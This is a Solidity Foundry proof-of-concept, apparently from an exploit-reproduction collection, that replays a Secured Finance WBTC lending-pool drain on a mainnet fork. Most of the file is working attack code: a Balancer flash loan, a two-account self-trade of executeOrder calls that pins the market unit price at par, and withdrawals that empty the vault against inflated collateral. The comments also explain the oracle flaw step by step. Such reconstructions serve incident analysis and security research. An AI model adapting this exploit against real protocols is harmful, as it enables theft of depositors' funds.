// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Secured Finance (Secured.Fi) lending-market exploit — Ethereum. Collateral for a fixed-rate
// lending order book is valued from getMarketUnitPrice(), computed as
// blockTotalAmount / blockTotalFutureValue over orders filled in the CURRENT block. Because the
// attacker controls BOTH sides of an order that match each other inside one block (a flash-loan-funded
// self-trade, posted from two attacker accounts so the legs form real counterparties instead of
// netting out), they drive that ratio up to par (10000 = 100%). That makes a cheaply-acquired lend
// position get valued as if it were fully-backed collateral, and they withdraw the pool's real WBTC
// against that fake collateral.
//
// Reference tx (largest, cleanest single execution of the bug — the WBTC drain executed by the MEV
// searcher "coffeebabe" 0xc0ffeebabe..., who replayed the original attacker's revealed strategy):
//   0xcd6159860783d8d481cc4bf4dceddc88acdca6bb08f6445525b2904cfd75b1da  (block 25914192)
// Original attacker's failed attempt (reverted OOG mid-exploit): 0x5d4e4fa9...ce92777
// Two later, smaller USDC drains by separate copycat bots are NOT modelled here.
//
// SCOPE: this PoC reconstructs only the CORE VULNERABILITY — one attacker manipulating
// getMarketUnitPrice() by same-block self-trading and draining against the inflated fake collateral.
// It deliberately does NOT reproduce coffeebabe's downstream WBTC->WETH swap or its priority-fee
// payment to the block builder (that ~28.8 ETH transfer is an MEV inclusion bribe, not part of the
// vulnerability), nor the other copycat drains. The reported ~$104K total spans all of those separate
// drains; this reproduces the single WBTC drain (~0.9 WBTC, ~$72K) — see the assertion note below.
//
// Addresses (Ethereum):
//   TokenVault (victim pool) : 0xb74749b2213916b1da3b869e41c7c57f1db69393 (proxy -> TokenVault impl)
//   LendingMarketController  : 0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2 (proxy -> impl)
//   WBTC                     : 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599 (8 decimals)
//   Balancer V2 Vault        : 0xBA12222222228d8Ba445958a75a0704d566BF2C8 (fee-free WBTC flash loan)
//
// ROOT CAUSE — confirmed against Secured Finance's own verified source (LendingMarketController impl
// 0x60ccbf7e..., library contracts/protocol/libraries/OrderBookLib.sol) and the WBTC-drain trace:
//
//   OrderBookLib.getMarketUnitPrice(self, isReadOnly):
//     unitPrice = blockUnitPriceHistory[0];
//     if ((lastOrderTimestamp != block.timestamp || unitPrice == 0 || isReadOnly) && isReliableBlock)
//         unitPrice = blockTotalAmount * 10000 / blockTotalFutureValue;   // PRICE_DIGIT = 10000
//
//   updateBlockUnitPriceHistory(...): within one block it just SUMS blockTotalAmount/
//   blockTotalFutureValue from each fill and flips isReliableBlock = true as soon as
//   blockTotalAmount >= minimumReliableAmount (or on a fresh market whose history price is still 0).
//
//   So there is NO time-weighting and NO manipulation resistance beyond that per-block volume gate,
//   and the gate is trivially cleared by flash-loan-funded same-block self-trading: the attacker fills
//   enough self-matched volume to make isReliableBlock true, and the resulting price is exactly the
//   attacker-chosen blockTotalAmount/blockTotalFutureValue ratio. The collateral path reads it with
//   isReadOnly = true, so it always takes that manipulated same-block ratio. Confirmed permissionless:
//   in the real tx a plain externally-deployed contract (not any privileged Secured.Fi role) makes
//   every executeOrder / deposit / withdraw call below.
//
// Function signatures are the real ones (4-byte-confirmed against the trace and matched to the
// verified source ABI): executeOrder(bytes32,uint256,uint8,uint256,uint256)=0xf43947c7,
// cancelOrder(bytes32,uint256,uint48)=0x49f2ccbf, cleanUpFunds(bytes32,address)=0x9519832b,
// deposit(bytes32,uint256)=0x1de26e16, withdraw(bytes32,uint256)=0x040cf020. No bytecode, no
// raw calldata replay — every step is a typed call to the victim's actual functions.
//
// Run:
//   forge test --contracts src/test/2026-09/SecuredFi_exp.sol -vvv

interface ILendingMarketController {
    // side: 0 = LEND, 1 = BORROW. amount in WBTC (8 dec); unitPrice in 1e4 units (10000 = par).
    function executeOrder(bytes32 ccy, uint256 maturity, uint8 side, uint256 amount, uint256 unitPrice)
        external
        returns (bool);
    function cancelOrder(bytes32 ccy, uint256 maturity, uint48 orderId) external returns (bool);
    function cleanUpFunds(bytes32 ccy, address user) external returns (bool);
}

interface ITokenVault {
    function deposit(bytes32 ccy, uint256 amount) external payable;
    function withdraw(bytes32 ccy, uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract SecuredFi_exp is Test {
    address internal constant CTRL = 0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2;
    address internal constant VAULT = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    address internal constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    SecuredFiExploit internal exploit;

    function setUp() public {
        // Parent block of the WBTC-drain tx: real protocol state immediately before the exploit.
        vm.createSelectFork("mainnet", 25_914_191);
        // The real WBTC drain executed in the next block (25914192). Advance the clock to it so the
        // self-trade runs in a FRESH block: OrderBookLib.updateBlockUnitPriceHistory resets its
        // per-block totals only when lastOrderTimestamp != block.timestamp, so running under the
        // parent block's own timestamp would wrongly accumulate onto stale same-block state.
        vm.roll(25_914_192);
        vm.warp(1_788_648_191);
        exploit = new SecuredFiExploit();

        vm.label(CTRL, "LendingMarketController");
        vm.label(VAULT, "TokenVault(victim)");
        vm.label(address(WBTC), "WBTC");
        vm.label(BALANCER, "BalancerVault");
        vm.label(address(exploit), "Exploit");
    }

    function testExploit() public {
        uint256 vaultBefore = WBTC.balanceOf(VAULT);
        emit log_named_decimal_uint("TokenVault WBTC before", vaultBefore, 8);
        assertEq(WBTC.balanceOf(address(exploit)), 0, "attacker starts with no WBTC");

        exploit.attack();

        uint256 profit = WBTC.balanceOf(address(exploit)); // net WBTC kept after the flash loan is repaid
        uint256 vaultAfter = WBTC.balanceOf(VAULT);
        emit log_named_decimal_uint("TokenVault WBTC after", vaultAfter, 8);
        emit log_named_decimal_uint("attacker WBTC profit", profit, 8);

        // Profit is measured in WBTC (the asset drained from the TokenVault). The pool held ~0.9117
        // WBTC; the self-trade lets the attacker withdraw essentially all of it on top of recovering
        // their own flash-loaned deposit, netting ~0.9 WBTC (~$72K at the time) — the WBTC-drain figure.
        // We assert against this single drain, not the ~$104K multi-bot total, because the other drains
        // are separate transactions by separate actors exploiting the same public bug.
        assertGt(profit, 0.5e8, "attacker should net ~the pool's WBTC via inflated fake collateral");
        assertLt(vaultAfter, vaultBefore, "TokenVault must be drained");
    }
}

bytes32 constant WBTC_CCY = bytes32("WBTC"); // 0x5742544300..00, the market currency key
uint256 constant MATURITY = 1830211200; // the open WBTC order book the attacker used
address constant CTRL_ADDR = 0x35e9D8e0223A75E51a67aa731127C91Ea0779Fe2;
address constant VAULT_ADDR = 0xB74749b2213916b1dA3b869E41c7c57f1db69393;
IERC20 constant WBTC_TOKEN = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

// Second attacker-controlled account. The core manipulation is a CROSS-ACCOUNT self-trade: this
// "maker" deposits WBTC and posts a LEND order at par while the main exploit posts the matching
// BORROW. Placing both legs from ONE account nets them out and creates no fillable position; using
// two accounts makes the legs real counterparties, so a filled position is booked at par and
// getMarketUnitPrice() locks onto par (10000). That is what inflates the main account's cheap
// (unitPrice-3) lend position into "fully-backed" collateral. Confirmed against the WBTC-drain
// trace, where this leg ran from the forwarder 0x50f02612.
contract SecuredFiMaker {
    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    // Deposit `amount` WBTC (already transferred in by the exploit) and post a lend order at
    // `unitPrice` so the exploit's borrow can match it inside the same block.
    function depositAndLend(uint256 amount, uint256 unitPrice) external {
        require(msg.sender == owner, "only owner");
        WBTC_TOKEN.approve(VAULT_ADDR, type(uint256).max);
        ITokenVault(VAULT_ADDR).deposit(WBTC_CCY, amount);
        ILendingMarketController(CTRL_ADDR).executeOrder(WBTC_CCY, MATURITY, 0, amount, unitPrice);
    }
}

// Named attacker contract. Funds itself with a Balancer WBTC flash loan, then runs the real
// self-trade-inflate-drain sequence against Secured Finance inside receiveFlashLoan. Every call is a
// typed call to the protocol's actual functions.
contract SecuredFiExploit {
    address internal constant CTRL = CTRL_ADDR;
    address internal constant VAULT = VAULT_ADDR;
    IERC20 internal constant WBTC = WBTC_TOKEN;
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 internal constant FLASH_AMOUNT = 91_000_000; // 0.91 WBTC, same as the real attack
    SecuredFiMaker internal maker;

    function attack() external {
        maker = new SecuredFiMaker();
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WBTC);
        amounts[0] = FLASH_AMOUNT;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata, /* tokens */
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata /* userData */
    ) external {
        require(msg.sender == address(BALANCER), "only balancer");

        // Real collateral: deposit the flash-loaned WBTC into the TokenVault.
        WBTC.approve(VAULT, type(uint256).max);
        ITokenVault(VAULT).deposit(WBTC_CCY, FLASH_AMOUNT);

        // --- Phase 1: build a cheap (unitPrice=3) lend giving huge future value for tiny principal, ---
        // plus small orders that establish this block's price history / isReliableBlock, then withdraw.
        _order(0, 99998, 3); // cheap lend -> enormous future value per principal (the fake collateral)
        _order(0, 1, 9500);
        _order(0, 1, 1);
        _order(0, 1, 9200);
        _order(0, 1, 9300);
        _order(0, 1, 2);
        _cancel(5);
        _order(1, 2, 9300);
        _order(0, 1, 9400);
        _order(0, 1, 9100);
        _order(1, 1, 9400);
        _cancel(8);
        _clean();
        _withdraw(type(uint256).max); // recover the deposit against the now-inflated valuation

        // --- Phase 2: the CROSS-ACCOUNT par self-trade that pins getMarketUnitPrice() at par. ---
        // Fund the maker (0.9 WBTC) and have it post the LEND at par; the exploit posts the matching
        // BORROW so a real 0.9 WBTC position is booked at par, then withdraw against it.
        WBTC.transfer(address(maker), 90_000_000);
        maker.depositAndLend(90_000_000, 10000); // HELPER: deposit 0.9 WBTC + lend at par
        _order(1, 90_000_000, 10000); // EXP: borrow at par, matches the maker's lend
        _withdraw(90_000_000);

        // --- Phase 3: top up the manipulated price and drain the pool's remaining WBTC. ---
        ITokenVault(VAULT).deposit(WBTC_CCY, 100);
        _order(1, 5, 9270);
        _order(1, 3, 9250);
        _order(1, 4, 10000);
        _order(1, 9, 9900);
        _order(1, 6, 9260);
        _order(1, 89_999_000, 9700);
        _order(1, 1, 9230);
        _order(1, 5, 9800);
        _order(1, 4, 9240);
        _cancel(18);
        _order(1, 2, 9220);
        _order(0, 15, 9260);
        _cancel(15);
        _cancel(12);
        _order(1, 2, 9260);
        _cancel(19);
        _cancel(22);
        _clean();
        _withdraw(type(uint256).max); // final drain of the pool's remaining WBTC

        // Repay the Balancer flash loan (fee is 0 on Balancer); keep the drained WBTC as profit.
        WBTC.transfer(address(BALANCER), amounts[0] + feeAmounts[0]);
    }

    function _order(uint8 side, uint256 amount, uint256 unitPrice) internal {
        ILendingMarketController(CTRL).executeOrder(WBTC_CCY, MATURITY, side, amount, unitPrice);
    }

    function _cancel(uint48 orderId) internal {
        try ILendingMarketController(CTRL).cancelOrder(WBTC_CCY, MATURITY, orderId) {} catch {}
    }

    function _clean() internal {
        try ILendingMarketController(CTRL).cleanUpFunds(WBTC_CCY, address(this)) {} catch {}
    }

    function _withdraw(uint256 amount) internal {
        ITokenVault(VAULT).withdraw(WBTC_CCY, amount);
    }
}
